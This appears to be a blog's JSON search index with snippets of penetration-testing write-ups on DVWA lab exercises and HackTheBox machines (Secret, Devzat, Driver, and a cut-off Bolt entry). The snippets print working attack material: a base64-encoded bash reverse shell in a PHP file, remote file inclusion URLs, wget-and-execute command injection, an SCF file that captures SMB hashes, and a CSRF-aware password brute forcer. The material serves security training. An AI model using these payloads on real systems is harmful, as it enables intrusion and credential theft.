    "snippet": "This is an exercise in OWASP DVWA for local and remote file inclusion.File Inclusion - DVWADifficulty: LowIn this mode, we are presented with 3 URLs, both of which accept a filename as a value to the GET parameter page;Changing the value to /etc/hostname gave me the hostname of the box, along with the rest of the page;That’s cool and all, but we want to see if we can get RCE using this file inclusion vulnerability. Since the default files assigned to the page parameter all end with .php, and no PHP code was seen in the HTML returned by the server, this indicate the file is not just read, but processed as PHP code. This means we can get code execution if we can trick the application into loading a malicious PHP file.So I started testing for remote file inclusion vulnerability, which will make it much easier to execute arbitrary code, and it was found to be vulnerable;So I created a PHP file that will execute a bash reverse shell, and saved it as shell.php;&amp;lt;?php system(&quot;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQ== | base64 -d | bash&quot;);?&amp;gt;Going to the URL http://buster/dvwa/vulnerabilities/fi/?page=http://172.17.0.1/shell.php gave me a shell on the box;Difficulty: MediumIn this mode, LFI was achieved by setting page=/etc/hostname;However, RFI no longer works when supplying a HTTP URL. This is probably due to some sort of filter the application is using. Fun fact about URL protocols: they are case insensitive. So http://somehost.tld is same as HTTP://somehost.tld. This could be used to easily bypass filters that do not account for this. Testing this on the application, i was able to achieve RFI, and gain code execution;Difficulty: HighNone of our previous LFI and RFI payloads work in this level. I was able to achieve LFI on the application using the file:/// protocol;Testing for file inclusion using php://filter/convert.base64-encode/resource=&amp;lt;file&amp;gt;, which could have being used to read the source code of the application for analysis, kept failing.The LFI is still enough for RCE if we can chain it we any other vulnerability that allow us to write files on the server, and DVWA is vulnerable to arbitrary file upload.Bonus: LFI to RCE with KadimusKadimus is a nice tool that can be used to easily scan for and exploit LFI vulnerabilities, and you can install it from github.Running the tool using the command;kadimus -u &#39;http://buster/dvwa/vulnerabilities/fi/?page=include.php&#39; --cookie &#39;security=low; PHPSESSID=p40eq58f52c6e08rku3gb6leb8&#39;kadimus was able to detect a few ways the application is vulnerable to LFI;Best thing about kadimus is it makes it very easy to go from LFI to code execution. Using the data wrap technique, this can be exploited with the command;kadimus -u &#39;http://buster/dvwa/vulnerabilities/fi/?page=include.php&#39; --cookie &#39;security=low; PHPSESSID=p40eq58f52c6e08rku3gb6leb8&#39; -T data --parameter page --shellThis gave me a shell on the box;The shell you get with kadimus is stateless, so you may want to upgrade to a proper shell as soon as you have code execution;"
  },
  
  {
    "title": "CSRF + Stored XSS - DVWA",
    "url": "/posts/dvwa/dvwa_csrf_plus_xss.html",
    "categories": "dvwa",
    "tags": "dvwa, stored xss, csrf",
    "date": "2022-03-27 00:00:00 +0100",
    
    "snippet": "This is an exercise in OWASP DVWA where I chained Stored XSS with CSRF.CSRF and Stored XSS - DVWAFor this challenge, we will be chaining the CSRF vulnerability with stored XSS vulnerability since there is no other way to make another user in the application interact with our payload. We will be using the account of smithy, whose password is password, to target the user admin, which I am logged into in a private window.Difficulty: EasyFor this mode, we are presented with a simple password reset form;Note that the form does not ask users to input their current passwords, and no CSRF token is used. The data is also submitted in a GET request, which will make it more convenient to exploit;As the user smithy, I added a stored XSS payload that will reset the password of any user that visit the page to hacked;Going to the page as the user admin, we got some broken image thumbnail;So I tried to login using admin:hacked, and it worked!Difficulty: MediumAgain, we were presented with the same form with no CSRF tokens or requirement to input current password. Attempt to exploit stored XSS in the txtName gave an error;Doing it in the mtxMessage field blanked out the body;Since the txtName field is only complaining about the length of the input, we could exploit this by setting up a short URL that redirect to our target URL. So I built a simple python program that can handle the redirect;#!/usr/bin/python3#-------------------------------------------------------# A simple script for setting up a static HTTP redirect.#                      Author: https://4g3nt47.github.io#-------------------------------------------------------import sys, socket, threading# Called in a separate thread. Handles the redirection.def redirect(conn, target_url):  conn.recv(9999)  conn.send(f&quot;HTTP/1.1 302 Found\\r\\nServer: Apache/2.4.38\\r\\nContent-Length: 0\\r\\nLocation: {target_url}\\n\\r\\n\\r\\n&quot;.encode())  conn.close()# Our main function.def main(lhost, lport, target_url):  # Create the socket server.  s = socket.socket()  s.bind((lhost, lport))  s.listen(100)  print(&quot;[*] Listening....&quot;)  while True:    try:      conn, addr = s.accept()      # Spawn a thread for the client.      print(f&quot;[*] Redirecting {addr[0]}...&quot;)      t = threading.Thread(target=redirect, args=(conn, target_url))      t.start()    except KeyboardInterrupt:      s.close()      breakif __name__ == &#39;__main__&#39;:  if len(sys.argv) &amp;lt; 4:    print(f&quot;[-] Usage: {sys.argv[0]} &amp;lt;lhost&amp;gt; &amp;lt;lport&amp;gt; &amp;lt;target_url&amp;gt;&quot;)    exit(1)  main(sys.argv[1], int(sys.argv[2]), sys.argv[3])  exit(0)Testing it locally with curl, my program seems to be working;Now we can set our stored XSS exploit to redirect user to our HTTP redirector, which will further redirect to our CSRF URL. The first redirect can be achieved using &amp;lt;img&amp;gt; tag with a broken URL that executes the JS code defined by onerror;Going to the XSS page as admin, our exploit was triggered;The password reset worked, but the exploit is very obvious. So I tried doing it with the payload &amp;lt;img src=&#39;&amp;lt;my-redirectors-URL&amp;gt;&#39;/&amp;gt;, and it worked. This is much more stealthier since target is not visibly redirected.Difficulty: HighSame password reset form as the previous levels, and the XSS payload used in [[#Difficulty Medium]] worked for this level too;Going to the stored XSS infected page changed the password of admin to hacked3."
  },
  
  {
    "title": "Command Injection - DVWA",
    "url": "/posts/dvwa/dvwa_command_injection.html",
    "categories": "dvwa",
    "tags": "dvwa, command injection",
    "date": "2022-03-27 00:00:00 +0100",
    
    "snippet": "This is an exercise in OWASP DVWA for command injection.Command Injection - DVWADifficulty: EasyThis mode gave us an input field for an IP address. Following submission, and a short delay, some output that look to be the result of the ping command was displayed;The user input is submitted in a POST request;Since we do know our instance of DVWA is running on a linux host, we were able to inject code into the command by using a semi colon, which act as a command separator;I was able to spawn a shell on the box using a base64-encoded bash reverse shell;Difficulty: MediumIn this mode, we are presented with the same form again;Using ; to inject commands simply hung the application for few secods, before returning blank result. Testing for other methods of command injection, we were able to inject code using a double pipe (||), which is used to execute a command if the previous command in the chain has failed;This injection can also be used to spawn a shell on the box;Command injection using conditional operators like || is not ideal because they depend on the exit code of the primary command you are injecting into.  So I tried wrapping the injected command in backticks, which will take precedence over the primary command because it’s output will be used to construct the primary command, and it worked;Difficulty: HighWe got the same form again in this mode;Command injection using || works;However, injecting any command that has a whitespace appears to fail;This indicate there may be a filter that blocks input that contain whitespaces. Since we know it’s a linux host, we may be able to bypass this using the internal field separator (IFS) environment variable, which is $IFS. In my bash shell, this is set to a newline character 0x0a;To my surprise, using the $IFS variable to bypass the filter didn’t work. However, while the command ls -al failed, the command ls / actually succeeded, which indicate whitespace is likely not what the filter is targetting. The only difference I can see between these two commands is the hyphen character (-).If the application is indeed blocking the user of -, I can no longer use my base64-encoded reverse shell because I need to decode it using base64 -d. Checking the box for tools we can take advantage of, wget was found;I can download a file to current directory withwget without using any - character. So created a bash script on my box containing my reverse shell payload, and host it using python’s web server;Using the payload || wget http://172.17.0.1/shell.sh, I was able to download it to the box. I then made it executable with || chmod +x shell.sh, and ran it using || ./shell.sh. This gave me a shell on the box;"
  },
  
  {
    "title": "Bruteforce - DVWA",
    "url": "/posts/dvwa/dvwa_bruteforce.html",
    "categories": "dvwa",
    "tags": "dvwa, ffuf, bruteforce, python",
    "date": "2022-03-27 00:00:00 +0100",
    
    "snippet": "This is an exercise in OWASP DVWA on login bruteforcing.Bruteforce - DVWADifficulty: EasyIn this mode, we were presented with a login form;The form is submitted in a GET request with not CSRF tokens;This was a piece of cake to bruteforce using ffuf. All we had to do is get our session cookie for the application since the form is only accessible by logged in users, and filter out the login error message, which is Username and/or password incorrect;Difficulty: MediumWe get the same login form, and it’s also submitted in a POST request. The only difference I can see is the delay in response by the server. This will slow down bruteforce attacks. Using ffuf to bruteforce the login showed some errors, and eventually the whole application appears to hang, even when requesting other pages. However, this delay appears to be tied only to the session cookie I’m using to do the bruteforce because no such delay was observed in another session.The bruteforce succeded after forcing ffuf to only use a single thread, which is slow;Difficulty: HighIn this mode, we get a similar login form again, but with a CSRF token;Altering the CSRF token showed that it’s being validated by the web application;            This means we need to account for this during our bruteforce. Earlier, we [[Initial Access#Making a Bruteforcer      made something similar]] for bruteforcing the main login page of DVWA.      This time, we are going to do something similar, but a little bit more advance. We will make the program multi-threaded.#!/usr/bin/python3#------------------------------------------------------------------# A bruteforcer for DVWA&#39;s bruteforce challenge 3 (high difficulty)#                                 Author: https://4g3nt47.github.io#------------------------------------------------------------------import os, sysimport requestsimport threadingfrom time import sleepfrom queue import Queueclass l3_bruteforcer:  # The class initializer.  def __init__(self, url, cookies, username, wordlist, threads):    self.messages = Queue() # Used to queue outputs by threads.    self.url = url    # Parse the cookie string (e.g &quot;user=someUser; priv=somePriv&quot;), there is probably a better way to do this :)    data = cookies.split(&quot;; &quot;)    self.cookies = {}    for line in data:      self.cookies[line.split(&quot;=&quot;)[0].strip()] = line.split(&quot;=&quot;)[1].strip()    self.username = username    self.wordlist = wordlist    self.threads = (1 if threads &amp;lt; 1 else threads)    self.abort = False  # Called when starting the bruteforce. Dispatches all threads.  def start(self):    # Load the wordlist into a Queue object    print(&quot;[*] Loading wordlist...&quot;);    self.words = Queue()    rfo = open(self.wordlist)    while True:      line = rfo.readline()      if not line: break # List exhausted      self.words.put(line.strip())    # Start the threads.    print(f&quot;[*] Starting {self.threads} threads...&quot;);    for i in range(self.threads):      t = threading.Thread(target=self.brute)      t.start()    # Loop and print logs.    while self.words.empty() == False and self.abort == False:      sleep(0.1)      while not self.messages.empty():        print(self.messages.get())  # The thread function.  def brute(self):    while not self.abort:      if self.words.empty():        break      password = self.words.get()      # Fetch the token.      sess = requests.Session()      body = sess.get(self.url, cookies=self.cookies).content.decode()    # No need for regular expressions when you can just split and index your way to glory!!!      token = body.split(&quot;name=&#39;user_token&#39; value=&#39;&quot;)[1].split(&quot;&#39;&quot;)[0].strip()      # Attempt to login      self.messages.put(f&quot;[*] Trying {self.username}:{password}&quot;)      body = sess.get(self.url + f&quot;?username={self.username}&amp;amp;password={password}&amp;amp;user_token={token}&amp;amp;Login=Login&quot;, cookies=self.cookies).content.decode()      if not &quot;Username and/or password incorrect&quot; in body: # Login successful???        self.messages.put(f&quot;[+] Authentiation successful: {self.username}:{password}&quot;)        self.abort = True # Signals other threads to quit.        breakif __name__ == &#39;__main__&#39;:  if len(sys.argv) &amp;lt; 6:    print(f&quot;[-] Usage: {sys.argv[0]} &amp;lt;url&amp;gt; &amp;lt;cookie&amp;gt; &amp;lt;username&amp;gt; &amp;lt;wordlist&amp;gt; &amp;lt;threads&amp;gt;&quot;)    exit(1)  bruteforcer = l3_bruteforcer(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], int(sys.argv[5]))  bruteforcer.start()Testing this with number of threads set to 1 worked;Setting the value of threads to more than 1 however, gave a false positive;Running the requests through a proxy, the threading appears to be messing up the CSRF token validation;This is likely because the token is tied to the session of a user, so by the time a token is issued for a request in one thread, other tokens issued to other threads will be invalidated. This makes the multi-threading feature added to the code completely useless :("
  },
  
  {
    "title": "Blind SQL Injection- DVWA",
    "url": "/posts/dvwa/dvwa_blind_sqli.html",
    "categories": "dvwa",
    "tags": "dvwa, sql injection, sqlmap",
    "date": "2022-03-27 00:00:00 +0100",
    
    "snippet": "This is an exercise in OWASP DVWA for exploiting blind SQL injection.Blind SQL Injection - DVWADifficulty: EasyIn this mode, we are given a simple form that checks if a user exists with the given ID;When given an invalid user ID, the application respond with this;The application appears to be vulnerable to blind SQL injection because injecting an SQL query that will always evaluate to true gave a positive output;Blind injections are a pain to exploit manually, so I called in sqlmap;sqlmap -u &#39;http://buster/dvwa/vulnerabilities/sqli_blind/?id=1&amp;amp;Submit=Submit&#39; -p id --cookie &#39;security=low; PHPSESSID=5c8siun1tr567gd519v1mivcbi&#39; --dbsTables in dvwa database;Contents of users table;Blind SQL injections can be pretty slow, even with sqlmap. You can speed up the process by increasing the number of threads using the --threads argument, but this could easily corrupt the data being dumped when sqlmap is using a time delay technique in an unstable connection.Difficulty: MediumIn this mode, we get a different form where the inputs are predefined in the form;The challenges are looking similar to the ones in error-based SQL injection section. Using a proxy and injecting an SQL query that always evaluate to true gives a positive result, indicating the application is vulnerable;This is exploitable using sqlmap;sqlmap -u &#39;http://buster/dvwa/vulnerabilities/sqli_blind/&#39; --data &#39;id=1&amp;amp;Submit=Submit&#39; --cookie &#39;security=medium; PHPSESSID=5c8siun1tr567gd519v1mivcbi&#39; -p id --dbsDifficulty: HighThis mode is also similar to the high difficulty level of the error-based SQL injection challenge. Only difference is this one is blind;"
  },
  
  {
    "title": "Secret - HackTheBox",
    "url": "/posts/hackthebox/secret.html",
    "categories": "hackthebox",
    "tags": "hackthebox, linux, api, nodejs, static analysis, git, jwt, command injection, information disclosure, tunneling, apport, custom exploitation",
    "date": "2022-03-26 00:00:00 +0100",
    
    "snippet": "Secret is an easy linux box where you have to exploit a sensitive information leak in a git repo to recover a JWT secret, which allows you to forge a JWT token that gives you access to an API endpoint that’s vulnerable to command injection. Once on the box, you will be exploiting a custom SUID binary that allows for core dumping.InfoReconNMAP# Nmap 7.70 scan initiated Sat Oct 30 20:00:45 2021 as: nmap -sV -sC -v -oN nmap.txt 10.10.11.120Nmap scan report for secret.htb (10.10.11.120)Host is up (0.25s latency).Not shown: 997 closed portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp   open  http    nginx 1.18.0 (Ubuntu)| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: DUMB Docs3000/tcp open  http    Node.js (Express middleware)| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-title: DUMB DocsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Oct 30 20:01:41 2021 -- 1 IP address (1 host up) scanned in 56.17 secondsWebThe /doc path in the website provides a demo for creating and accessing accounts using the API;Possible credential?Account login;There is a link to download source code in the homepage;It is a ZIP file, which I download and extract. It contains a .git folder in the root, so it’s a GIT repository. Running git log command showed something interesting;So I ran the git diff command using the commit ID to see what changes were made, and I got the token used to sign JWT tokens as indicated by the file routes/verifytoken.js;const jwt = require(&quot;jsonwebtoken&quot;);module.exports = function (req, res, next) {    const token = req.header(&quot;auth-token&quot;);    if (!token) return res.status(401).send(&quot;Access Denied&quot;);    try {        const verified = jwt.verify(token, process.env.TOKEN_SECRET);        req.user = verified;        next();    } catch (err) {        res.status(400).send(&quot;Invalid Token&quot;);    }};The login API is also vulnerable to user enumeration as login attempt using a valid email with a bad password said Password is wrong, while attempt with invalid email says Email is wrong.FootholdUsing Burp Suite, I was able to create an account using the following request;Logging into the account gave me a token, which I forged on https://jwt.io using the JWT secret obtained, and changed the username to theadmin (the administrative username obtained by going through the source files). Using the forged token, request to /api/priv showed I am now the admin;I am now authenticated as an admin, but still have no idea how to utilise the API.Using the package.json file in the root of the repo, which contains dependencies of the project and their version numbers, I started looking for exploits online, but couldn’t find anything interesting. So I continue to enumerate previous commits using git diff, and found an interesting commit with the ID e297a2797a5f62b6011654cf6fb6ccb6712d2d5b;That looks like a shell command that can be exploited if I can control the value of req.query.file. Crafting a request in Burp Suite for the endpoint, I got this;I assumed req.query is used to store all queries defined in the request, so I added a GET parameter named file with a test value, and it got included in the command;Injecting an encoded bash reverse shell in the file parameter, I got a shell as the user dasith;PrivEscCan’t list sudo permissions for the user as I still don’t have his password. netstat showed a service running locally, which was identified as MongoDB using telnet;Checking the .env file, I got a path for the service;The user does not have SSH public key authentication setup, so I used ssh-keygen to setup one, so I can setup port-forwarding to the MongoDB service over SSH. I still got the same error when trying to access the MongoDB service over HTTP.After reading up on MongoDB, I found a cheatsheet at https://gist.github.com/michaeltreat/d3bdc989b54cff969df86484e091fd0c that helped me enumerate the service. I found a database named web-auth containing four (4) hashes;Attempt to crack the hashes using john was taking way too long, so I aborted it and move on. One of the hashes was eventually cracked, but didn’t give me access to anything.Inside /opt/, I found a SUID binary owned by root, and what looks like the source code. Running it, it asks for a filename, and then report some stats for the file;Privileges are dropped when saving results, which means I can’t write anything to protected paths. Attempts to step through the process while loading protected files using strace and gdb failed because they can’t attach to a process of higher privileges.Going through the source code, I noticed core dumping was enabled;Fuzzing the program’s input did not cause the program to crash. After taking a sanity check, I realized I could cause a program to crash and dump core by sending it a SIGSEGV (signal ID: 11). Running kill -n 11 &amp;lt;PID&amp;gt; while the program is asking where the results should be saved, I was able to crash it;Checking /var/crash, I found the crash file generated;After googling around, I learned that such crash files can be processed using apport-unpack tool, so I did;The file CoreDump was identified as the core dump;So I load it in the gdb installed on the host, and searched the memory mappings of the program using thefind command, and manually go through the stack using x/s &amp;lt;some-address&amp;gt;, but could only locate the name of the file (/root/.ssh/id_rsa) that was given to the SUID binary before the crash. With the help of the strings command-line tool, I was able to extract the private key of root (which was the file given to the binary before the crash);I used the key to gain access to the box as root over SSH;Summary  Identified running services with nmap  Used the documentation to create an account on the web API.  Found the JWT token signing key in a previous commit in the source files using git diff, and used it to forge a token for the admin user.  Found the path /api/logs that’s accessible only to admins is vulnerable to command injection, which I exploited to gain access to the box as the user dasith  Inside the box as dasith;          Exploited a SUID binary by causing it to core dump after reading the private SSH key of the root user.      Retrieved the SSH key in the crash file using apport-unpack and strings, and gained root access to the box over SSH.      "
  },
  
  {
    "title": "Devzat - HackTheBox",
    "url": "/posts/hackthebox/devzat.html",
    "categories": "hackthebox",
    "tags": "hackthebox, linux, cve, command injection, influxdb, path traversal, tunneling, custom exploitation",
    "date": "2022-03-12 00:00:00 +0100",
    
    "snippet": "Devzat is a pretty easy medium linux box. It starts with a website that inform you about a chat service on the host accessible on port 8000. Some enumeration will yield a hidden subdomain that’s vulnerable to command injection. Once inside the box, there is an instance of InfluxDB running locally that’s vulnerable to CVE-2019-20933, which you can use to gain access to the box as another local user. Privesc involves exploiting a path traversal flaw in a custom code.InfoReconNMAP# Nmap 7.70 scan initiated Sun Oct 17 08:49:05 2021 as: nmap -sV -sC -oN nmap.txt 10.10.11.118Nmap scan report for 10.10.11.118Host is up (0.23s latency).Not shown: 997 closed portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)80/tcp   open  http    Apache httpd 2.4.41|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://devzat.htb/8000/tcp open  ssh     (protocol 2.0)| fingerprint-strings: |   NULL: |_    SSH-2.0-Go| ssh-hostkey: |_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8000-TCP:V=7.70%I=7%D=10/17%Time=616BD594%P=x86_64-pc-linux-gnu%r(NSF:ULL,C,&quot;SSH-2\\.0-Go\\r\\n&quot;);Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Oct 17 08:50:17 2021 -- 1 IP address (1 host up) scanned in 71.63 secondsWebPossible username patrick?Connecting to the SSH service on port 8000 gave the below output;Attempts to log in as the user patrick kept failing, saying it’s reserved for local use. This may be because the user patrick is the admin.Bruteforcing virtual hosts using ffuf discovered one;PetsThe add pet form above is used to add an entry to the pets list. Adding a pet generated the request;Bruteforcing the web root with ffuf kept giving 200 responses, even for invalid paths. Viewing the page source showed it is dynamically generated by a JavaScript code;So I downloaded the file and parsed it with js-beautify for easier analysis. I found the block of code that generates the request used for adding pets, and nothing more of interest;Newly added pet entries can be seen immediately after they have been added, but refreshing the page makes them disappear.Fuzzing the JSON dataDeleting all the parameters doesn’t have any visible effect on the parser at first, and the web app responded with Pet was added successfully. Breaking the JSON syntax produced an error message;Sometimes even after getting a success message from the POST request, reloading the JSON data does not show the new pet entry. However, after submitting only the name parameter, reloading the pets JSON data by sending GET request to /api/pet showed a new response;The species parameter is not being returned in the JSON data of the pets, but appears to be used to construct the characteristics parameter that describes the species. I assumed it’s being used to load the characteristics data, which will make it an interesting target for injection attacks like LFI and SQLi.After adding a characteristics parameter in the submitted JSON, it is overwritten in the JSON response obtained if the value given to the species parameter is valid (e.g: cat), but if it is not valid, the characteristics parameter in the JSON response gets set to exit status 1.The message exit status 1 is very interesting because that is usually the result of a function call or some system command. Return codes that are not equal to 0 usually indicate an error. So I started fuzzing the species and characteristics parameters for Command Injection flaws, and caught a break. The parameter species is vulnerable to command injection;I then exploited the command injection to gain access to the box as the user patrick;Going through the source code of the web app at /home/patrick/pets, I found the vulnerable code that let me in;It looks like the code is also vulnerable to local file inclusion (LFI).UserThe user patrick does not have the user flag, but it was found in the home of catherine.Inside the home directory of patrick, source code for the web apps were found, including a binary named petshop in the ~/pets directory.Using linPEAS and manual enumeration didn’t yield anything interesting. netstat idenitified a bunch of locally running services, so I setup some SSH tunnels so I can scan them from my box;I then ran an nmap scan on the ports to identify the services they are running;# Nmap 7.70 scan initiated Tue Oct 19 01:02:17 2021 as: nmap -sV -p6010,8443,53,8086 -oN nmap-hidden.txt localhostNmap scan report for localhost (127.0.0.1)Host is up (0.00023s latency).Other addresses for localhost (not scanned): ::1PORT     STATE  SERVICE VERSION53/tcp   closed domain6010/tcp open   x11?8086/tcp open   http    InfluxDB http admin 1.7.58443/tcp open   ssh     (protocol 2.0)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8443-TCP:V=7.70%I=7%D=10/19%Time=616E0B10%P=x86_64-pc-linux-gnu%r(NSF:ULL,C,&quot;SSH-2\\.0-Go\\r\\n&quot;);Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Oct 19 01:03:12 2021 -- 1 IP address (1 host up) scanned in 55.43 secondsThe service on port 8086 has been identified as a HTTP service, and viewing it in a browser just give a 404 Not found. Bruteforcing with ffuf found a few paths;Going to the /query path gave an authentication prompt;Googling showed that the version of InfluxDB on the host is vulnerable to authentication bypass, and was exploited using a python code obtained from the repo https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933InfluxDB is something I have never came across before, so I had to do a lot of googling to learn about it. Using a cheatsheet I found on GitHub at https://gist.github.com/tomazursic/6cc217e2644c619ceceefb8ce824925b, I was able to enumerate the service and found a hash for the user catherine in the devzat database inside the user measurement;The password woBeeYareedahc7Oogeephies7Aiseci does not appear to be a hash, so I just used to access the account of catherine on the host, and it worked;PrivEscThe user catherine does not have permission to run any command on the host using sudo. No files of interest were found in her home directory, so I ran linPEAS again in hope of finding something new, but it didn’t.Inside /var/backups, 2 backup files belonging to catherine were found. The files were extracted, but nothing of interest was found inside at a quick glance;Connecting to the SSH chat service locally on port 8443 as catherine showed some interesting messages from patrick;Since the default backups directory in linux is /var/backups, and the only files of interest in the directory are the previously discovered .zip files, I extracted them again to /dev/shm, and run the diff command on their extracted files, and found a password CeilingCatStillAThingIn2021?;Attempt to login as the root user using the password failed. In the text messages patrick talked about implementing a new feature that requires a password, so I continue to examine the output generated by the diff command, and noticed a function that appears to be used to read files from disk provided a path and a valid password were provided;So I logged back into the chat app as catherine and listed available commands using the /help command. One entry stood out;This is likely the command used to invoke the function used to read files using a path and a password. So I tried to read the file /etc/hostname to see if it works, which did not work because the application is prefixing /root/devzat to the filename given, as indicated by the error message. Using a simple path traversal payload, I was able to read the SSH key file of the root user;I copied the SSH key to my attack box, and used it to access the box as the root user over SSH;Summary  Identified services running on the host using nmap  Found the username patrick on the web page, which is not allowed to be used remotely on the SSH chat service.  Found a hidden subdomain pets.devzat.htb using ffuf          Fuzzing the JSON data submitted to the web app via POST request uncovered a command injection flaw, which was exploited to gain access to the box as the user patrick.        Inside the box as patrick;          Identified another user named catherine.      Discovered a local installation of InfluxDB that is vulnerable to authentication bypass, and was enumerated to obtain a password that gave access to the account of catherine.        Inside the box as catherine;          Connected to the local SSH chat service on port 8443 as catherine.      Received a chat log between patrick and catherine discussing a new feature that is password-protected, with the password obtainable from backup files in the default linux backups directory.      Located the password inside the backups and used it to access the feature, which is used to read files from disk. I used it to load the SSH private key of the root user.      "
  },
  
  {
    "title": "Driver - HackTheBox",
    "url": "/posts/hackthebox/driver.html",
    "categories": "hackthebox",
    "tags": "hackthebox, windows, smb, scf file attack, print nightmare, responder, metasploit, msfvenom, smb",
    "date": "2022-02-26 00:00:00 +0100",
    
    "snippet": "Driver is a fun and easy windows box. It’s running a web service that allows for file uploads, which you can exploit to perform an SCF File Attack to capture and crack the password of a local user using responder. After cracking the hash, you can exploit the Print Nightmare vulnerability to gain a privileged access to the box.AboutReconNMAP# Nmap 7.70 scan initiated Tue Oct  5 08:48:12 2021 as: nmap -sV -sC -v -oN nmap.txt 10.10.11.106Nmap scan report for 10.10.11.106Host is up (0.28s latency).Not shown: 997 filtered portsPORT    STATE SERVICE      VERSION80/tcp  open  http         Microsoft IIS httpd 10.0| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_  Basic realm=MFP Firmware Update Center. Please enter password for admin| http-methods: |   Supported Methods: OPTIONS TRACE GET HEAD POST|_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).135/tcp open  msrpc        Microsoft Windows RPC445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 7h14m09s, deviation: 0s, median: 7h14m09s| smb-security-mode: |   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2021-10-05 16:03:00|_  start_date: 2021-10-05 12:34:03Read data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Oct  5 08:49:26 2021 -- 1 IP address (1 host up) scanned in 74.97 secondsComplete port scan showed winrm on port 5985;WebLogin attempt using the credentials of admin:admin granted access;All the links in the navigation are dead, except one that allows for driver upload for firmware update;Request generated by file upload;On successful file upload;Use of the creds to access SMB failed, rpcclient null auth also failed;CrackMapExec also showed it’s not a valid SMB cred;Googling the title of the firmware update page kept linking me to the PrintNightmare vulnerabiity, but I was unable to exploit as I don’t have access to the SMB service.FootholdAfter a lot of googling as I am not very familiar with windows, I was introduced to SCF File Attacks. This attack can be exploited to capture SMB credentials by making authenticated users try to access an SMB service in an attackers control. I crafted a simple SCF file with the contents;[Shell]Command=2IconFile=\\\\10.10.14.95\\Badshare\\file.txt[Taskbar]command=ToggleDesktopNote that IconFile points to an SMB service running on my attack host. I used the upload form in the website and uploaded it as @exploit.scf. The @ symbol will move the file to the top of the share driver, or so I read, and it will be executed the moment a user browses the share.With responder running on my attack host with the command sudo responder -wrf --lm -v -I tun0, I was able to capture the hash of a user named tony;Feeding the hash to john, it had no problems cracking it;With the hash cracked, I had all I need to run PrintNightmare. I setup an SMB share with the name Test in a temporary directory on my attack host using Samba, and enabled anonymous logins. I used msfvenom to generate the DLL payload required by the exploit, and moved it into the root directory of the SMB share. The exploit ran through all it’s three (3) stages, but I couldn’t get a connection back. Running inotifywait -e CLOSE meterpreter.dll showed that the DLL was read when running the exploit.The payload I initially used was windows/meterpreter/reverse_tcp, so I changed it to windows/x64/shell_reverse_tcp;Running the exploit again, I got a high privilege shell on the box, sparing me the need for any sort of privesc;I found the user flag inside C:\\Users\\tony\\Desktop, and the root flag in C:\\Users\\Administrator\\Desktop.Summary  Identified running services using nmap  Got a login form on the website, which accept the credential admin:admin  Found a firmware update page in the admin panel that allows for file upload.  Performed an SCF File Attack to capture the SMB hash of a user named tony using responder, and cracked it using john.  Ran a PrintNightmare exploit on the target to gain a privileged access on the box."
  },
  
  {
    "title": "Bolt - HackTheBox",
    "url": "/posts/hackthebox/bolt.html",
    "categories": "hackthebox",
    "tags": "hackthebox, linux, web, docker, gpg, ssti, hash cracking, passbolt, webmail, roundcube",
    "date": "2022-02-19 00:00:00 +0100",
    
    "snippet": "Bolt is a very interesting medium linux box featuring some heavy enumeration. For foothold, you exploit a web page that’s vulnerable to SSTI. After some enumeration, you will find a MySQL credential in a configuration file, which will give you access to a local user. For privilege escalation, you will take advantage of a chrome extension that dumps GPG keys into it’s logs on disk.InfoReconNMAP# Nmap 7.70 scan initiated Fri Oct 22 08:49:31 2021 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.114Increasing send delay for 10.10.11.114 from 0 to 5 due to 39 out of 129 dropped probes since last increase.Nmap scan report for 10.10.11.114Host is up (0.22s latency).Not shown: 997 closed portsPORT    STATE SERVICE  VERSION22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp  open  http     nginx 1.18.0 (Ubuntu)|_http-favicon: Unknown favicon MD5: 76362BB7970721417C5F484705E5045D| http-methods: |_  Supported Methods: HEAD OPTIONS GET|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title:     Starter Website -  About 443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)|_http-favicon: Unknown favicon MD5: 82C6406C68D91356C9A729ED456EECF4| http-methods: |_  Supported Methods: GET HEAD POST|_http-server-header: nginx/1.18.0 (Ubuntu)| http-title: Passbolt | Open source password manager for teams|_Requested resource was /auth/login?redirect=%2F| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty 